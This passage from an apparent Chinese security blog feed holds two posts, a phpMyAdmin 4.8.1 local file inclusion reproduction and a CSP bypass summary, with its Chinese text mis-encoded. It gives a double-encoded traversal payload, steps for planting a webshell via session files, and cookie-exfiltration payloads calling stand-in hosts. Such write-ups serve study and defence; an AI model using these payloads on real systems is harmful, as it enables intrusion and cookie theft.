      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1 åå°LFI</title>
    <link href="https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/"/>
    <id>https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/</id>
    <published>2018-07-01T13:02:15.000Z</published>
    <updated>2018-08-14T16:34:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ChaMd5å›¢é˜ŸæŠ¥å‡ºæ¥çš„phpmyadminçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»Šå¤©å°±æ¥åˆ†æå¤ç°ä¸€ä¸‹ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/1.png"><p>æ¼æ´çš„è¾“å…¥ç‚¹æ˜¯ <code>include $_REQUEST[&#39;target&#39;];</code>å‡ºç°äº†æ–‡ä»¶åŒ…å«è¿™ç§å±é™©æ“ä½œï¼Œé‚£ä¹ˆæœ‰å¾ˆå¤§æ¦‚ç‡å‡ºç°é—®é¢˜ã€‚</p><p>æˆ‘ä»¬åªè¦ç»•è¿‡57ã€58ã€59è¡Œçš„æ£€æµ‹å°±å¯ä»¥æˆåŠŸæ§åˆ¶åŒ…å«æ–‡ä»¶ã€‚</p><p>ç¬¬57è¡Œç”¨æ­£åˆ™åŒ¹é…å¼€å¤´ä¸ºindexçš„è·¯å¾„ï¼Œåªè¦è·¯å¾„å¼€å¤´æ²¡æœ‰indexå³å¯ã€‚</p><p>ç¬¬58è¡Œæ£€ç´¢è¾“å…¥ä¸­æ˜¯å¦æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œé»‘åå•åœ¨ç¬¬50è¡Œï¼Œå¯ä»¥çœ‹åˆ° import.phpå’Œexport.phpï¼Œåªè¦å‚æ•°ä¸­æ²¡è¿™ä¸¤ä¸ªphpå°±è¡Œã€‚</p><p>ç¬¬59è¡Œè¦çœ‹Coreç±»çš„æ–¹æ³•checkPageValidityã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/2.png"><p>ç¬¬452è¡Œçš„ç¬¬ä¸‰ä¸ªifåˆ¤æ–­ï¼Œæ£€æŸ¥äº†è¾“å…¥ä¸­çš„ç™½åå•ï¼Œå¦‚æœæœ‰è¿™äº›phpå°±ç›´æ¥è¿”å›trueã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/3.png"><p>æ²¡ä»€ä¹ˆç”¨ï¼Œç»§ç»­çœ‹ä¸‹é¢çš„æ“ä½œã€‚mb_substræˆªå–å­—ç¬¦ä¸²ä»å¼€å§‹çš„ä½ç½®åˆ°?å¤„çš„å­—ç¬¦ä¸²ï¼Œå†æ¬¡æ£€ç´¢ç™½åå•ã€‚</p><p>è™½ç„¶å¯ä»¥åœ¨urlä¸­åŠ å…¥?æ¥é€šè¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œä½†æ˜¯éšåçš„includeå› ä¸ºæœ‰?ï¼Œæ‰€ä»¥å°±æ— æ³•åŒ…å«æˆ‘ä»¬æ§åˆ¶çš„æ–‡ä»¶ã€‚</p><p>ä¹‹åï¼Œé‡ç‚¹æ¥äº†ï¼Œåœ¨465è¡Œå‡ºç°äº†ä¸€ä¸ªurlè§£ç æ“ä½œã€‚ç”±äºè¿™é‡Œè§£ç ä¹‹ååˆé‡å¤äº†ä¸€éä¸Šé¢çš„æˆªå–æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥è®©?ç¼–ç ä¸¤æ¬¡æ¥ç»•è¿‡ç™½åå•æ£€æµ‹ï¼Œä¹‹åè¿”å›åˆ°includeçš„æ—¶å€™ä¹Ÿèƒ½åŒ…å«æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚æœ€åçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../tongfang.txt</span><br></pre></td></tr></table></figure><p>db_sql.phpæ˜¯ç™½åå•ä¸­çš„ä¸€ä¸ªï¼Œç„¶åç”¨ä¸¤æ¬¡URlç¼–ç è¿‡çš„?æˆªæ–­ï¼Œä¸¤æ¬¡URLç¼–ç çš„?åœ¨phpçš„urldecodeåä¼šå˜æˆ?ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ï¼Œä¹‹åincludeæ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºdb_sql.php%3fæ˜¯ä¸€ä¸ªç›®å½•ï¼Œç„¶ååŒ…å«æœ€åçš„æ–‡ä»¶ã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/4.png"><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><ol><li>åˆ©ç”¨åˆ›å»ºæ–°çš„è¡¨ï¼Œåœ¨è¡¨çš„å­—æ®µä¸­æ”¾å…¥Webshellï¼Œç„¶ååŒ…å«æ•°æ®åº“æ–‡ä»¶</li><li>æ‰§è¡Œ<code>SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;</code>,ç„¶ååŒ…å«phpçš„sessionæ–‡ä»¶</li></ol><p>æ¨èç”¨ç¬¬äºŒç§æ–¹æ³•æ›´åŠ éšè”½å¹¶ä¸”ä¸éœ€è¦çŒœæµ‹æ•°æ®åº“æ–‡ä»¶è·¯å¾„ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/5.png"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ¼æ´éœ€è¦åœ¨ç™»å½•phpmyadminä¹‹åæ‰èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥åªè¦å¯†ç å¼ºåº¦å¤Ÿï¼Œæš‚æ—¶å°±ä¸ä¼šæœ‰å¤ªå¤§å±é™©ï¼Œä½†è¿˜æ˜¯æ¨èå°½å¿«å‡çº§ã€‚å¦å¤–å¦‚æœæ˜¯åœ¨sessionä¸­å†™äº†Webshellï¼Œç”¨èœåˆ€è¿çš„æ—¶å€™å¿…é¡»è¦æœ‰phpmyadminçš„sessionæ‰è¡Œâ€¦â€¦</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=23&amp;srcid=0701Pk3Qg7hDrUSsZWD5dffq#rd" target="_blank" rel="noopener">ChaMd5çš„æ–‡ç« </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰ChaMd5å›¢é˜ŸæŠ¥å‡ºæ¥çš„phpmyadminçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»Šå¤©å°±æ¥åˆ†æå¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h2&gt;&lt;img src=&quot;/2018/07/01/
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CSPç»•è¿‡æ€»ç»“</title>
    <link href="https://hurricane618.me/2018/06/30/csp-bypass-summary/"/>
    <id>https://hurricane618.me/2018/06/30/csp-bypass-summary/</id>
    <published>2018-06-30T03:33:01.000Z</published>
    <updated>2018-08-14T16:35:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å‘åœ¨ä¿¡å®‰ä¹‹è·¯ä¸Š <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ï¼Œä¹‹åæ–‡ç« ç•¥æœ‰ä¿®æ”¹ã€‚</p><h1 id="CSPç»•è¿‡æ€»ç»“"><a href="#CSPç»•è¿‡æ€»ç»“" class="headerlink" title="CSPç»•è¿‡æ€»ç»“"></a>CSPç»•è¿‡æ€»ç»“</h1><p>ä»Šå¹´çš„0CTFé¢„é€‰èµ›6é“webé¢˜ï¼Œå…¶ä¸­ä¸‰é“éƒ½æ¶‰åŠCSPçš„çŸ¥è¯†ç‚¹ï¼Œç®€ç›´å¯æ€•ã€‚ã€‚ã€‚è¿™æ¬¡è¶ç€ç©ºé—²æ—¶é—´å°±ç¨ç¨æ€»ç»“ä¸€ä¸‹CSPç»•è¿‡æ–¹é¢çš„çŸ¥è¯†ï¼Œæ— è®ºæ˜¯å¯¹ä»¥åCTFæ¯”èµ›è¿˜æ˜¯å·¥ä½œéƒ½å¾ˆæœ‰å¸®åŠ©ã€‚</p><h2 id="CSPçš„åŸºç¡€"><a href="#CSPçš„åŸºç¡€" class="headerlink" title="CSPçš„åŸºç¡€"></a>CSPçš„åŸºç¡€</h2><p>CSPçš„å…¨ç§°Content Security Policyï¼Œç”¨æ¥é˜²å¾¡XSSæ”»å‡»çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§ç”±å¼€å‘è€…å®šä¹‰çš„å®‰å…¨æ€§æ”¿ç­–æ€§ç”³æ˜ï¼Œé€šè¿‡CSPæŒ‡å®šå¯ä¿¡çš„å†…å®¹æ¥æºï¼Œè®©WEBå¤„äºä¸€ä¸ªå®‰å…¨çš„è¿è¡Œç¯å¢ƒä¸­ã€‚</p><p>ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”,å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ã€‚ç­–ç•¥æŒ‡ä»¤æœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>default-src</td><td>å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥</td></tr><tr><td>connect-src</td><td>å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥</td></tr><tr><td>font-src</td><td>å®šä¹‰ Font åŠ è½½ç­–ç•¥</td></tr><tr><td>frame-src</td><td>å®šä¹‰ Frame åŠ è½½ç­–ç•¥</td></tr><tr><td>img-src</td><td>å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥</td></tr><tr><td>media-src</td><td>å®šä¹‰ \&lt;audio>ã€\&lt;video> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>object-src</td><td>å®šä¹‰ \&lt;applet>ã€\&lt;embed>ã€\&lt;object> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>script-src</td><td>å®šä¹‰ JS åŠ è½½ç­–ç•¥</td></tr><tr><td>style-src</td><td>å®šä¹‰ CSS åŠ è½½ç­–ç•¥</td></tr><tr><td>sandbox</td><td>å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox</td></tr><tr><td>report-uri</td><td>å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿—</td></tr></tbody></table><p>å†…å®¹æºæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æº</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>*</td><td>é€šé…ç¬¦ï¼Œå…è®¸ä»»ä½•URLï¼Œé™¤äº†data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>å…è®¸åŠ è½½foo.comå­åŸŸçš„èµ„æº</td></tr><tr><td>abc.foo.com</td><td>åªèƒ½åŠ è½½è¿™ä¸ªåŸŸåä¸‹çš„èµ„æº</td></tr><tr><td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td><td>åªèƒ½ç”¨HTTPSåŠ è½½åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>https:</td><td>é€šè¿‡HTTPSå¯ä»¥åŠ è½½ä»»æ„åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>â€˜noneâ€™</td><td>ä»£è¡¨ç©ºé›†,å³ä¸åŒ¹é…ä»»ä½•URL,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜selfâ€™</td><td>ä»£è¡¨å’Œæ–‡æ¡£åŒæº,åŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-inlineâ€™</td><td>å…è®¸ä½¿ç”¨å†…è”èµ„æº,å¦‚å†…è”çš„\&lt;script>å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„\&lt;style>å…ƒç´ ,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-evalâ€™</td><td>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>data:</td><td>å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æº</td></tr><tr><td>mediastream:</td><td>å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº</td></tr></tbody></table><p>å†…å®¹æºæœ‰ä¸‰ç§ï¼šæºåˆ—è¡¨ã€å…³é”®å­—å’Œæ•°æ®ï¼Œå…¶ä¸­<em>ï¼Œ</em>.foo.comï¼Œabc.foo.comï¼Œ<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ï¼Œhttps:å±äºæºåˆ—è¡¨ã€‚â€™noneâ€™ï¼Œâ€™selfâ€™ï¼Œâ€™unsafe-inlineâ€™ï¼Œâ€™unsafe-evalâ€™å±äºå…³é”®å­—ã€‚data:ï¼Œmediastream:å±äºæ•°æ®ã€‚</p><p>ä¾‹å­1</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯é»˜è®¤çš„å†…å®¹æºå¿…é¡»ä¸ºåŒæºæˆ–è€…æ˜¯ trustedscripts.foo.com</p><p>ä¾‹å­2</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡æºå¯ä»¥ä¸ºåŒæºå†…å®¹æˆ–è€…æ˜¯data:å¼•ç”¨çš„èµ„æºï¼Œåª’ä½“æºå¿…é¡»ä½¿ç”¨mediastream:å¼•ç”¨ï¼Œé™¤æ­¤ä»¥å¤–çš„éƒ½æ‰§è¡Œé»˜è®¤å†…å®¹æºåˆ¤æ–­ï¼Œå¿…é¡»ä¸ºåŒæºå†…å®¹ã€‚æ›´åŠ è¯¦ç»†çš„å¯ä»¥çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªåœ¨çº¿çš„CSPå¤´éƒ¨ç”Ÿæˆå™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ·±å…¥ç†è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªCSPå®‰å…¨æ£€æµ‹ç½‘ç«™ï¼Œèƒ½å¤Ÿæä¾›ä¸€äº›å‚è€ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure><h2 id="CSPçš„è¿›åŒ–â€“nonce-script-CSPå’Œstrict-dynamic"><a href="#CSPçš„è¿›åŒ–â€“nonce-script-CSPå’Œstrict-dynamic" class="headerlink" title="CSPçš„è¿›åŒ–â€“nonce script CSPå’Œstrict-dynamic"></a>CSPçš„è¿›åŒ–â€“nonce script CSPå’Œstrict-dynamic</h2><p>è¿™æ˜¯Googleå›¢é˜Ÿ2016å¹´åœ¨<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>ä¸­æ­£å¼æå‡ºçš„CSPç§ç±»ï¼Œä¸ºäº†è§£å†³CSPçˆ†å‡ºçš„å„ç§å„æ ·çš„é—®é¢˜ã€‚</p><h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>åŠ¨æ€ç”Ÿæˆnonceå­—ç¬¦ä¸²ï¼Œåªæœ‰åŒ…å«nonceå­—æ®µå¹¶å­—ç¬¦ä¸²ç›¸ç­‰çš„scriptå—å¯ä»¥è¢«æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥åœ¨åç«¯å®ç°ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½é‡æ–°ç”Ÿæˆï¼Œè¿™æ ·å°±å¯ä»¥æ— è§†å“ªä¸ªåŸŸæ˜¯å¯ä¿¡çš„ï¼Œä¿è¯æ‰€åŠ è½½çš„ä»»ä½•èµ„æºéƒ½æ˜¯å¯ä¿¡çš„ï¼Œå¹¶ä¸”è¿˜èƒ½æ‹¦æˆªåé¢æ’å…¥çš„scriptã€‚</p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure><p>SDæ„å‘³ç€å¯ä¿¡jsç”Ÿæˆçš„jsä»£ç æ˜¯å¯ä¿¡çš„ã€‚</p><p>è¿™ä¸ªCSPè§„åˆ™ä¸»è¦æ˜¯ç”¨æ¥é€‚åº”å„ç§å„æ ·çš„ç°ä»£å‰ç«¯æ¡†æ¶ï¼Œé€šè¿‡è¿™ä¸ªè§„åˆ™ï¼Œå¯ä»¥å¤§å¹…åº¦é¿å…å› ä¸ºé€‚åº”æ¡†æ¶è€Œå˜å¾—æ¾æ•£çš„CSPè§„åˆ™ã€‚</p><h2 id="CSP-Bypassçš„æ–¹æ³•æ€»ç»“"><a href="#CSP-Bypassçš„æ–¹æ³•æ€»ç»“" class="headerlink" title="CSP Bypassçš„æ–¹æ³•æ€»ç»“"></a>CSP Bypassçš„æ–¹æ³•æ€»ç»“</h2><p>CSPå¯¹å‰ç«¯æ”»å‡»çš„é˜²å¾¡ä¸»è¦æœ‰ä¸¤ä¸ªï¼š</p><ol><li>é™åˆ¶jsçš„æ‰§è¡Œã€‚</li><li>é™åˆ¶å¯¹ä¸å¯ä¿¡åŸŸçš„è¯·æ±‚ã€‚</li></ol><p>æ¥ä¸‹æ¥çš„å¤šç§Bypassæ‰‹æ®µä¹Ÿæ˜¯å›´ç»•è¿™ä¸¤ç§çš„</p><h3 id="urlè·³è½¬"><a href="#urlè·³è½¬" class="headerlink" title="urlè·³è½¬"></a>urlè·³è½¬</h3><p>åˆ©ç”¨urlè·³è½¬ï¼Œå›é¿ä¸¥æ ¼çš„CSPã€‚</p><p>åœ¨default-src â€˜noneâ€™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨metaæ ‡ç­¾å®ç°è·³è½¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨å…è®¸unsafe-inlineçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨window.locationï¼Œæˆ–è€…window.openä¹‹ç±»çš„æ–¹æ³•è¿›è¡Œè·³è½¬ç»•è¿‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>\&lt;a>æ ‡ç­¾é…åˆç«™å†…çš„æŸäº›å¯æ§JSç‚¹å‡»æ“ä½œæ¥è·³è½¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç½‘ç«™æœ¬èº«çš„è·³è½¬æ¥å£</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h3 id="lt-link-æ ‡ç­¾é¢„åŠ è½½"><a href="#lt-link-æ ‡ç­¾é¢„åŠ è½½" class="headerlink" title="\&lt;link>æ ‡ç­¾é¢„åŠ è½½"></a>\&lt;link>æ ‡ç­¾é¢„åŠ è½½</h3><p>CSPå¯¹linkæ ‡ç­¾çš„é¢„åŠ è½½åŠŸèƒ½è€ƒè™‘ä¸å®Œå–„ã€‚åœ¨Chromeä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ‡ç­¾å‘é€cookieæˆ–è€…å…¶ä»–æ•°æ®</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨Firefoxä¸‹æ— æ³•ç”¨prefetchï¼Œå› ä¸ºFirefoxæœ‰æ›´é«˜çš„å®‰å…¨è§„èŒƒï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ–¹å¼ï¼Œæ¯”å¦‚dns-prefetchï¼Œå°†cookieä½œä¸ºå­åŸŸåï¼Œç”¨dnsé¢„è§£æçš„æ–¹å¼æŠŠcookieå¸¦å‡ºå»ï¼ŒæŸ¥çœ‹dnsæœåŠ¡å™¨çš„æ—¥å¿—å°±èƒ½å¾—åˆ°cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>linkæ ‡ç­¾é™¤äº†è¿™ä¸¤ç§relï¼Œè¿˜æœ‰preconnectã€prerenderã€subresourceã€preloadç­‰</p><h3 id="åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨"><a href="#åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨" class="headerlink" title="åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨"></a>åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨</h3><p>æœ‰äº›ç½‘ç«™é™åˆ¶åªæœ‰æŸäº›è„šæœ¬æ‰èƒ½ä½¿ç”¨ï¼Œå¾€å¾€ä¼šä½¿ç”¨\&lt;script>æ ‡ç­¾çš„nonceå±æ€§ï¼Œåªæœ‰nonceä¸€è‡´çš„è„šæœ¬æ‰ç”Ÿæ•ˆï¼Œæ¯”å¦‚CSPè®¾ç½®æˆä¸‹é¢è¿™æ ·</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå½“è„šæœ¬æ’å…¥ç‚¹ä¸ºå¦‚ä¸‹çš„æƒ…å†µæ—¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>æ’å…¥ç‚¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ’å…¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨æµè§ˆå™¨çš„å®¹é”™æœºåˆ¶ä¼šæ‹¼æˆä¸€ä¸ªæ–°çš„scriptæ ‡ç­¾ï¼Œå…¶ä¸­çš„srcå¯ä»¥è‡ªç”±è®¾å®š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨DOM-XSS"><a href="#åˆ©ç”¨DOM-XSS" class="headerlink" title="åˆ©ç”¨DOM XSS"></a>åˆ©ç”¨DOM XSS</h3><p>å¦‚æœJSå­˜åœ¨æ“ä½œlocation.hashå¯¼è‡´çš„XSSï¼Œé‚£ä¹ˆè¿™æ ·çš„æ”»å‡»è¯·æ±‚ä¸ä¼šç»è¿‡åå°ï¼Œé‚£ä¹ˆnonceåçš„éšæœºå€¼å°±ä¸ä¼šåˆ·æ–°ã€‚å¯ä»¥è§ä¸‹é¢lorexxarå¸ˆå‚…çš„åšæ–‡</p><figure class="highlight plain"><table><tr><td 